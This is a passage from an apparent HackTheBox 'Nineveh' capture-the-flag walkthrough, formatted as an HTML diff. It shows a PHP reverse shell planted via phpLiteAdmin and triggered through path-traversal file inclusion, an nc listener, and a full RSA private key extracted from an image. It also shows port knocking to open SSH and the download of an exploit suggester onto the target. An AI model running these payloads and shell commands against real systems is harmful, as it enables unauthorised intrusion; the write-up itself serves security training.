+        The only way for us to browse to our created database is via the file inclusion found earlier on <code>http://10.10.10.43/department/manage.php</code>.<br>
+        We know that the file inclusion vuln will only include files named <code>ninevehNotes</code>, so we have to name our database <code>ninevehNotes.php</code>.<br>
+        After that, the exploit the is more or less the same.<br>
+        <br>
+        First, create a new database named <code>ninevehNotes.php</code>.<br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        Switch to the databse it by clicking on it.<br>
+        <img alt="images\2-12.png" src="images/2-12.png"><br>
+        <br>
+        Create a new table in the databse with 1 field<br>
+        <img alt="images\2-13.png" src="images/2-13.png"><br>
+        <br>
+        Create a field in the table, with a Type of <code>TEXT</code>, and set the Default Value to a simple php reverse shell that points to your attacking machine (credit goes here - <a href="https://gist.github.com/rshipp/eee36684db07d234c1cc">https://gist.github.com/rshipp/eee36684db07d234c1cc</a>)<br>
+        <br>
+        Original linked above - <code>&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.0.0.10/1234 0&gt;&amp;1'"); ?&gt;</code><br>
+        Modified version for phpLiteAdmin - <code>&lt;?php exec("/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.12/9001 0&gt;&amp;1\""); ?&gt;</code><br>
+        <br>
+        When inserting the above php code into a sqlite table, the <code>'</code> will get converted into <code>"</code>, which will cause your shell to fail.<br>
+        You can either modify php code after it's been injected into the table via phpLiteAdmin, or simply escape the inner <code>"</code> using <code>\</code>.<br>
+        <br>
+        <img alt="images\2-14.png" src="images/2-14.png"><br>
+        <br>
+        <img alt="images\2-15.png" src="images/2-15.png"><br>
+        <br>
+        Our PHP code has been "injected"!<br>
+        To run the php code, we just need to browse to it.<br>
+        On the phpLiteAdmin homepage you'll see that path to your database - <code>/var/tmp/ninevehNotes.php</code><br>
+        <img alt="images\2-16.png" src="images/2-16.png"><br>
+        <br>
+        Start a listener on your attacking machine to receive the shell<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;nc&nbsp;-lvnp&nbsp;9001<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        To activate the shell, we need to run <code>/var/tmp/ninevehNotes.php</code>.<br>
+        We know from the error message that we're currently in the <code>/var/www/html/department</code> directory.<br>
+        <img alt="images\2-17.png" src="images/2-17.png"><br>
+        <br>
+        Therefore, to reach <code>/var/tmp/ninevehNotes.php</code>, we need to navigate up 2 directories to reach <code>/var</code>.<br>
+        The file inclusion to reach <code>/var/tmp/ninevehNotes.php</code> will be <code>../../../tmp/ninevehNotes.php</code>.<br>
+        The page should hang, and you should see a shell on your listener<br>
+            <div class="codebox">
+                [...]<br>
+                listening&nbsp;on&nbsp;[any]&nbsp;9001&nbsp;...<br>
+                connect&nbsp;to&nbsp;[10.10.14.12]&nbsp;from&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>UNKNOWN<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;[10.10.10.43]&nbsp;44384<br>
+                <span style="color:#ff9d00;font-weight:700">bash:</span>&nbsp;cannot&nbsp;<span style="color:#ff9d00;font-weight:700">set</span>&nbsp;terminal&nbsp;process&nbsp;group&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>1373<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;Inappropriate&nbsp;ioctl&nbsp;<span style="color:#ff9d00;font-weight:700">for</span>&nbsp;<span style="color:#7f0044;font-weight:400">device</span><br>
+                bash:&nbsp;no&nbsp;job&nbsp;control&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;this&nbsp;shell<br>
+                www-data@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>html<span style="color:#ff9d00;font-weight:700">/</span>department$&nbsp;
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Priv-Esc to amrois</strong></h1><br>
+        <br>
+        <a id="h2-5" name="h2-5"></a><strong></strong>
+        <h2><strong>5) /var/www/ssl/secure_notes</strong></h2><br>
+        Earlier on the HTTP site, amrois mentioned that there was a secret folder.<br>
+        Inside <code>/var/www/ssl</code>, you'll find <code>secure_notes</code>.<br>
+        www-data@nineveh:/var/www/ssl$ ls -alh<br>
+        [...]<br>
+        drwxr-xr-x 2 root root 4.0K Jul 2 2017 secure_notes<br>
+        www-data@nineveh:/var/www/ssl/secure_notes$ ls -alh<br>
+        total 2.8M<br>
+        drwxr-xr-x 2 root root 4.0K Jul 2 2017 .<br>
+        drwxr-xr-x 4 root root 4.0K Jul 2 2017 ..<br>
+        -rw-r--r-- 1 root root 71 Jul 2 2017 index.html<br>
+        -rw-r--r-- 1 root root 2.8M Jul 2 2017 nineveh.png<br>
+        <br>
+        <code>nineveh.png</code> is intersting.<br>
+        Run <code>strings</code> against the image and you'll find a amrois's ssh key hidden inside.<br>
+            <div class="codebox">
+                www-data@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>ssl<span style="color:#ff9d00;font-weight:700">/</span>secure_notes$&nbsp;<span style="color:#ff9d00;font-weight:700">which</span>&nbsp;strings<br>
+                <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>strings<br>
+                www-data@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>var<span style="color:#ff9d00;font-weight:700">/</span>www<span style="color:#ff9d00;font-weight:700">/</span>ssl<span style="color:#ff9d00;font-weight:700">/</span>secure_notes$&nbsp;strings&nbsp;-n&nbsp;10&nbsp;nineveh.png&nbsp;<br>
+                [...]<br>
+                secret<span style="color:#ff9d00;font-weight:700">/</span>nineveh.priv<br>
+                00000003213<br>
+                13126045656<br>
+                -----BEGIN&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+                MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP<span style="color:#ff9d00;font-weight:700">/</span>wk8YAR0Z4mmvHNJ3UfsAhpI<br>
+                H9<span style="color:#ff9d00;font-weight:700">/</span>Bz1abFbrt16vH6<span style="color:#ff9d00;font-weight:700">/</span>jd8m0urg<span style="color:#ff9d00;font-weight:700">/</span>Em7d<span style="color:#ff9d00;font-weight:700">/</span>FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU<br>
+                PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt<span style="color:#ff9d00;font-weight:700">/</span>M8r+eTHx1bVznlBG5<br>
+                FQq1<span style="color:#ff9d00;font-weight:700">/</span>wmB65c8bds5tETlacr<span style="color:#ff9d00;font-weight:700">/</span>15Ofv1A2j+vIdggxNgm8A34xZiP<span style="color:#ff9d00;font-weight:700">/</span>WV7+7mhgvcnI<br>
+                3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR<span style="color:#ff9d00;font-weight:700">/</span>z+oj4sQT<br>
+                X+<span style="color:#ff9d00;font-weight:700">/</span>1<span style="color:#ff9d00;font-weight:700">/</span>xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn<br>
+                KiI<span style="color:#ff9d00;font-weight:700">/</span>FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV<span style="color:#ff9d00;font-weight:700">/</span>IAVWV3QAk<br>
+                FYDm5gTLIfuPDOV5jq<span style="color:#ff9d00;font-weight:700">/</span>9Ii38Y0DozRGlDoFcmi<span style="color:#ff9d00;font-weight:700">/</span>mB92f6s<span style="color:#ff9d00;font-weight:700">/</span>sQYCarjcBOKDUL58z<br>
+                GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg<span style="color:#ff9d00;font-weight:700">/</span>G+Ic0Ij45uoR<br>
+                JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr<span style="color:#ff9d00;font-weight:700">/</span>APJBXe9Ibkq4j0lj29V5dT<span style="color:#ff9d00;font-weight:700">/</span>HSoF17VWo<br>
+                9odiTBWwwzPVv0i<span style="color:#ff9d00;font-weight:700">/</span>JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu<br>
+                Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb<br>
+                ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl<br>
+                1tXMOZ<span style="color:#ff9d00;font-weight:700">/</span>T5fV8RQAZrj1BMxl+<span style="color:#ff9d00;font-weight:700">/</span>UiV0IIbgF07sPqSA<span style="color:#ff9d00;font-weight:700">/</span>uNXwx2cLCkhucCgYEAwP3b<br>
+                vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx<br>
+                DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89<br>
+                P+6+1FXXA1r<span style="color:#ff9d00;font-weight:700">/</span>Dt<span style="color:#ff9d00;font-weight:700">/</span>zIYN3Vtgo28mNNyK7rCr<span style="color:#ff9d00;font-weight:700">/</span>pUcCgYEAgHMDCp7hRLfbQWkksGzC<br>
+                fGuUhwWkmb1<span style="color:#ff9d00;font-weight:700">/</span>ZwauNJHbSIwG5ZFfgGcm8ANQ<span style="color:#ff9d00;font-weight:700">/</span>Ok2gDzQ2PCrD2Iizf2UtvzMvr+i<br>
+                tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc<span style="color:#ff9d00;font-weight:700">/</span>MmXC<br>
+                iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1<br>
+                MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh<br>
+                PNilsNNjfnt<span style="color:#ff9d00;font-weight:700">/</span>G3RZiq1<span style="color:#ff9d00;font-weight:700">/</span>Uc+6dFrvO<span style="color:#ff9d00;font-weight:700">/</span>AIdw+goqQduXfcDOiNlnr7o5c0<span style="color:#ff9d00;font-weight:700">/</span>Shi9tse<br>
+                i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc<br>
+                il6RYzQV<span style="color:#ff9d00;font-weight:700">/</span>2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB<span style="color:#ff9d00;font-weight:700">/</span>DywYYScAWwF7<br>
+                fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG<br>
+                -----END&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+                secret<span style="color:#ff9d00;font-weight:700">/</span>nineveh.pub<br>
+                00000000620<br>
+                13126060277<br>
+                ssh-rsa&nbsp;AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY<span style="color:#ff9d00;font-weight:700">//</span>CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc<span style="color:#ff9d00;font-weight:700">/</span>gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX<span style="color:#ff9d00;font-weight:700">/</span>CYHrlzxt2zm0ROVpyv<span style="color:#ff9d00;font-weight:700">/</span>Xk5+<span style="color:#ff9d00;font-weight:700">/</span>UDaP68h2CDE2CbwDfjFmI<span style="color:#ff9d00;font-weight:700">/</span>9ZXv7uaGC9ycjeirC<span style="color:#ff9d00;font-weight:700">/</span>EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH<span style="color:#ff9d00;font-weight:700">/</span>P6iPixBNf7<span style="color:#ff9d00;font-weight:700">/</span>X<span style="color:#ff9d00;font-weight:700">/</span>FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R&nbsp;amrois@nineveh.htb
+            </div>
+        </div><br>
+        <br>
+        We can use <code>amrois</code>'s private key to login via ssh, so save their private key to a file on your attacking system.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;nano&nbsp;id_rsa&nbsp;<br>
+                -----BEGIN&nbsp;RSA&nbsp;PRIVATE&nbsp;KEY-----<br>
+                MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP<span style="color:#ff9d00;font-weight:700">/</span>wk8YAR0Z4mmvHNJ3UfsAhpI<br>
+                H9<span style="color:#ff9d00;font-weight:700">/</span>Bz1abFbrt16vH6<span style="color:#ff9d00;font-weight:700">/</span>jd8m0urg<span style="color:#ff9d00;font-weight:700">/</span>Em7d<span style="color:#ff9d00;font-weight:700">/</span>FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        This doesn't make much sense, however, because we know from the initial nmap scan that port 22, SSH, isn't open.<br>
+        Run <code>netstat</code> to check what ports are listening locally.<br>
+            <div class="codebox">
+                www-data@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;netstat&nbsp;-panut<br>
+                <span style="color:#ff9d00;font-weight:700">(</span>Not&nbsp;all&nbsp;processes&nbsp;could&nbsp;be&nbsp;identified,&nbsp;non-owned&nbsp;process&nbsp;<span style="color:#ff9d00;font-weight:700">info</span><br>
+                &nbsp;will&nbsp;not&nbsp;be&nbsp;shown,&nbsp;you&nbsp;would&nbsp;have&nbsp;to&nbsp;be&nbsp;root&nbsp;to&nbsp;see&nbsp;it&nbsp;all.<span style="color:#ff9d00;font-weight:700">)</span><br>
+                Active&nbsp;Internet&nbsp;connections&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>servers&nbsp;and&nbsp;established<span style="color:#ff9d00;font-weight:700">)</span><br>
+                Proto&nbsp;Recv-Q&nbsp;Send-Q&nbsp;Local&nbsp;Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Foreign&nbsp;Address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PID<span style="color:#ff9d00;font-weight:700">/</span>Program&nbsp;name<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>22&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                tcp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>443&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0<span style="color:#ff9d00;font-weight:700">:</span>*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LISTEN&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Ah, SSH is listening locally.<br>
+        This is slightly strange.<br>
+        <br>
+        Run reconnaissance against the system a little more, and you'll find that you can read <code>amrois</code>'s email.<br>
+            <div class="codebox">
+                www-data@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">ls</span>&nbsp;-alh&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>mail<br>
+                total&nbsp;12K<br>
+                drwxrwsr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;&nbsp;2&nbsp;root&nbsp;&nbsp;&nbsp;mail&nbsp;4.0K&nbsp;Jul&nbsp;&nbsp;2&nbsp;&nbsp;2017&nbsp;.<br>
+                drwxr-xr<span style="color:#ffdd00;font-weight:400">-x</span>&nbsp;14&nbsp;root&nbsp;&nbsp;&nbsp;root&nbsp;4.0K&nbsp;Jul&nbsp;&nbsp;2&nbsp;&nbsp;2017&nbsp;..<br>
+                -rw<span style="color:#ffdd00;font-weight:400">-r</span>--r--&nbsp;&nbsp;1&nbsp;amrois&nbsp;mail&nbsp;&nbsp;483&nbsp;Jul&nbsp;&nbsp;2&nbsp;&nbsp;2017&nbsp;amrois<br>
+                www-data@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;<span style="color:#ff9d00;font-weight:700">/</span>var<span style="color:#ff9d00;font-weight:700">/</span>mail<span style="color:#ff9d00;font-weight:700">/</span>amrois&nbsp;<br>
+                From&nbsp;root@nineveh.htb&nbsp;&nbsp;Fri&nbsp;Jun&nbsp;23&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>04<span style="color:#ff9d00;font-weight:700">:</span>19&nbsp;2017<br>
+                Return-Path<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&lt;root@nineveh.htb&gt;<br>
+                X-Original-To<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;amrois<br>
+                Delivered-To<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;amrois@nineveh.htb<br>
+                Received<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;by&nbsp;nineveh.htb&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Postfix,&nbsp;from&nbsp;userid&nbsp;1000<span style="color:#ff9d00;font-weight:700">)</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">id</span>&nbsp;D289B2E3587<span style="color:#ff9d00;font-weight:700">;</span>&nbsp;Fri,&nbsp;23&nbsp;Jun&nbsp;2017&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>04<span style="color:#ff9d00;font-weight:700">:</span>19&nbsp;-0500&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>CDT<span style="color:#ff9d00;font-weight:700">)</span><br>
+                To<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;amrois@nineveh.htb<br>
+                From<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;root@nineveh.htb<br>
+                Subject<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Another&nbsp;Important&nbsp;note<span style="color:#ff9d00;font-weight:700">!</span><br>
+                Message-Id<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&lt;20170623190419.D289B2E3587@nineveh.htb&gt;<br>
+                Date<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Fri,&nbsp;23&nbsp;Jun&nbsp;2017&nbsp;14<span style="color:#ff9d00;font-weight:700">:</span>04<span style="color:#ff9d00;font-weight:700">:</span>19&nbsp;-0500&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>CDT<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                Amrois<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;please&nbsp;knock&nbsp;the&nbsp;door&nbsp;next&nbsp;time<span style="color:#ff9d00;font-weight:700">!</span>&nbsp;571&nbsp;290&nbsp;911
+            </div>
+        </div><br>
+        <br>
+        Amrois has been told by the admin to knock!<br>
+        Considering that SSH is closed externally, this is a hint at port knocking.<br>
+        <br>
+        <a id="h2-6" name="h2-6"></a><strong></strong>
+        <h2><strong>6) Port knocking</strong></h2><br>
+        Port knocking is a security through obfuscation technique.<br>
+        A port will, initially, be closed. However, if a series of ports are knocked at in order, i.e. a specific set of packets are sent to the web server in a specific order, then that initially closed port will open.<br>
+        We can deduce from the email that we must knock on ports <code>571</code>, <code>290</code> and <code>911</code> in order for port 22 to open.<br>
+        <br>
+        Double-check that port 22 is closed.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;nmap&nbsp;-p&nbsp;22&nbsp;10.10.10.43<br>
+                Starting&nbsp;Nmap&nbsp;7.80&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>nmap.org&nbsp;<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;at&nbsp;2019-09-25&nbsp;12<span style="color:#ff9d00;font-weight:700">:</span>05&nbsp;BST<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;&nbsp;&nbsp;&nbsp;SERVICE<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;filtered&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>
+            </div>
+        </div><br>
+        <br>
+        It is.<br>
+        Install <code>knock</code> with <code>apt install knockd</code>, and knock no ports <code>571</code>, <code>290</code> and <code>911</code>.<br>
+        And Nmap scan port 22 again. It's open!<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;knock&nbsp;10.10.10.43&nbsp;571&nbsp;290&nbsp;911<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;nmap&nbsp;-p&nbsp;22&nbsp;10.10.10.43<br>
+                [...]<br>
+                PORT&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                22<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>
+            </div>
+        </div><br>
+        <br>
+        Change the permissions of <code>amrois</code>'s private key that you saved earlier to <code>600</code>, and log in!<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;600&nbsp;id_rsa<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;-i&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>id_rsa&nbsp;amrois@10.10.10.43<br>
+                [...]<br>
+                Ubuntu&nbsp;16.04.2&nbsp;LTS<br>
+                Welcome&nbsp;to&nbsp;Ubuntu&nbsp;16.04.2&nbsp;LTS&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>GNU<span style="color:#ff9d00;font-weight:700">/</span>Linux&nbsp;4.4.0-62-generic&nbsp;x86_64<span style="color:#ff9d00;font-weight:700">)</span><br>
+                <br>
+                &nbsp;*&nbsp;Documentation<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>help.ubuntu.com<br>
+                &nbsp;*&nbsp;Management<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>landscape.canonical.com<br>
+                &nbsp;*&nbsp;Support<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>ubuntu.com<span style="color:#ff9d00;font-weight:700">/</span>advantage<br>
+                <br>
+                133&nbsp;packages&nbsp;can&nbsp;be&nbsp;updated.<br>
+                66&nbsp;updates&nbsp;are&nbsp;security&nbsp;updates.<br>
+                <br>
+                <br>
+                You&nbsp;have&nbsp;mail.<br>
+                Last&nbsp;<span style="color:#ff9d00;font-weight:700">login:</span>&nbsp;Mon&nbsp;Jul&nbsp;&nbsp;3&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>19<span style="color:#ff9d00;font-weight:700">:</span>59&nbsp;2017&nbsp;from&nbsp;192.168.0.14<br>
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:</span>~$&nbsp;<span style="color:#ff9d00;font-weight:700">cat</span>&nbsp;user.txt<br>
+                82a864f...
+            </div>
+        </div><br>
+        <br>
+        <a id="h1-3" name="h1-3"></a><strong></strong>
+        <h1><strong>Priv-Esc to root - via Kernel Exploit</strong></h1><br>
+        <br>
+        <a id="h2-7" name="h2-7"></a><strong></strong>
+        <h2><strong>7) get_rekt</strong></h2><br>
+        Download <code>linux-exploit-suggester-2</code> to your attacking machine and serve it to the target with <code>python -m SimpleHTTPServer</code>.<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;-q&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>raw.githubusercontent.com<span style="color:#ff9d00;font-weight:700">/</span>jondonas<span style="color:#ff9d00;font-weight:700">/</span>linux-exploit-suggester-2<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>linux-exploit-suggester-2.pl<br>
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>nineveh#&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer&nbsp;<br>
+                Serving&nbsp;HTTP&nbsp;on&nbsp;0.0.0.0&nbsp;port&nbsp;8000&nbsp;...
+            </div>
+        </div><br>
+        <br>
+        And <code>wget</code> the script to your from your attacking machine to the target.<br>
+            <div class="codebox">
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">wget</span>&nbsp;-q&nbsp;http<span style="color:#ff9d00;font-weight:700">://</span>10.10.14.12<span style="color:#ff9d00;font-weight:700">:</span>8000<span style="color:#ff9d00;font-weight:700">/</span>linux-exploit-suggester-2.pl
+            </div>
+        </div><br>
+        <br>
+        Run it :)<br>
+            <div class="codebox">
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;<span style="color:#ff9d00;font-weight:700">chmod</span>&nbsp;+x&nbsp;linux-exploit-suggester-2.pl&nbsp;<br>
+                amrois@nineveh<span style="color:#ff9d00;font-weight:700">:/</span>tmp$&nbsp;.<span style="color:#ff9d00;font-weight:700">/</span>linux-exploit-suggester-2.pl&nbsp;<br>
+                <br>
+                &nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#############################</span><br>
+                &nbsp;&nbsp;&nbsp;&nbsp;Linux&nbsp;Exploit&nbsp;Suggester&nbsp;2<br>
+                &nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#############################</span><br>
